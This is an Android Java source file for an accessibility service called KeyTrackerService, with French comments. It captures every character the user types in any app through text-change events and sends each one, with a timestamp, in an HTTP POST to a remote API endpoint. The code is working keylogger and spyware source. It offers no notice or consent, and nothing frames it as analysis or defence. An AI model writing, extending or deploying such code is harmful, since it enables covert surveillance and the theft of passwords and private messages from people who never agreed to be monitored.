package com.andtracker;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.util.Log;
import android.os.Handler;
import android.os.Looper;
import android.content.res.Resources;
import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import org.json.JSONObject;

public class KeyTrackerService extends AccessibilityService {
    private static final String TAG = "KeyTrackerService";
    private Handler handler = new Handler(Looper.getMainLooper());
    private String apiEndpoint;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // Capturer les événements de changement de texte
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            CharSequence beforeText = event.getBeforeText();
            CharSequence text = event.getText();
            
            if (text != null && text.length() > 0) {
                // Si on a le texte avant, on peut détecter les caractères ajoutés
                if (beforeText != null && beforeText.length() > 0) {
                    int beforeLength = beforeText.length();
                    int currentLength = text.length();
                    
                    // Nouveaux caractères ajoutés
                    if (currentLength > beforeLength) {
                        String newChars = text.subSequence(beforeLength, currentLength).toString();
                        for (int i = 0; i < newChars.length(); i++) {
                            sendKeyToServer(String.valueOf(newChars.charAt(i)));
                        }
                    }
                } else {
                    // Pas de texte avant, envoyer le dernier caractère seulement
                    if (text.length() > 0) {
                        sendKeyToServer(String.valueOf(text.charAt(text.length() - 1)));
                    }
                }
            }
        }
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "Service interrupted");
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        // Récupérer l'URL de l'endpoint depuis les ressources
        try {
            Resources res = getResources();
            apiEndpoint = res.getString(res.getIdentifier("api_endpoint", "string", getPackageName()));
        } catch (Exception e) {
            Log.e(TAG, "Error getting API endpoint from resources", e);
            apiEndpoint = "https://votre-app.vercel.app/api/keys";
        }
        Log.d(TAG, "Accessibility service connected. API endpoint: " + apiEndpoint);
    }

    private void sendKeyToServer(String key) {
        if (apiEndpoint == null) {
            Log.e(TAG, "API endpoint not initialized");
            return;
        }
        
        handler.post(() -> {
            new Thread(() -> {
                try {
                    URL url = new URL(apiEndpoint);
                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                    connection.setRequestMethod("POST");
                    connection.setRequestProperty("Content-Type", "application/json");
                    connection.setDoOutput(true);

                    JSONObject jsonObject = new JSONObject();
                    jsonObject.put("key", key);
                    jsonObject.put("timestamp", System.currentTimeMillis());

                    String jsonInputString = jsonObject.toString();
                    
                    try (OutputStream os = connection.getOutputStream()) {
                        byte[] input = jsonInputString.getBytes(StandardCharsets.UTF_8);
                        os.write(input, 0, input.length);
                    }

                    int responseCode = connection.getResponseCode();
                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        Log.d(TAG, "Key sent successfully: " + key);
                    } else {
                        Log.e(TAG, "Failed to send key. Response code: " + responseCode);
                    }

                    connection.disconnect();
                } catch (Exception e) {
                    Log.e(TAG, "Error sending key to server", e);
                }
            }).start();
        });
    }
}
